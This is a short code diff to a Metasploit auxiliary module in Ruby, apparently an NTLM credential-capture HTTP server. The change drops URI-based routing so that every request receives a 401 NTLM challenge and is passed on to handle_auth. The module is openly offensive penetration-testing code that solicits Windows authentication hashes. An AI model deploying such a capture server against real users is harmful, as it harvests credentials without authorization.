@@ -65,31 +65,23 @@ class Metasploit3 < Msf::Auxiliary
 
 	def on_request_uri(cli, request)
 		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
-		case request.uri
-			when %r{^#{datastore['URIPATH']}.*sessid=}
-				send_not_found(cli)
-			when self.get_resource
-				# If the host has not started auth, send 401 authenticate with only the NTLM option
-				if(!request.headers['Authorization'])
-					response = create_response(401, "Unauthorized")
-					response.headers['WWW-Authenticate'] = "NTLM"
-					cli.send_response(response)
-				else
-					method,hash = request.headers['Authorization'].split(/\s+/,2)
-					# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
-					if(method != "NTLM")
-						print_status("Unrecognized Authorization header, responding with 404")
-						send_not_found(cli)
-						return false
-					end
 
-					response = handle_auth(cli,hash)
-					cli.send_response(response)
-				end
-			else
-				print_status("Responding with 404")
+		# If the host has not started auth, send 401 authenticate with only the NTLM option
+		if(!request.headers['Authorization'])
+			response = create_response(401, "Unauthorized")
+			response.headers['WWW-Authenticate'] = "NTLM"
+			cli.send_response(response)
+		else
+			method,hash = request.headers['Authorization'].split(/\s+/,2)
+			# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
+			if(method != "NTLM")
+				print_status("Unrecognized Authorization header, responding with 404")
 				send_not_found(cli)
 				return false
+			end
+
+			response = handle_auth(cli,hash)
+			cli.send_response(response)
 		end
 	end
 
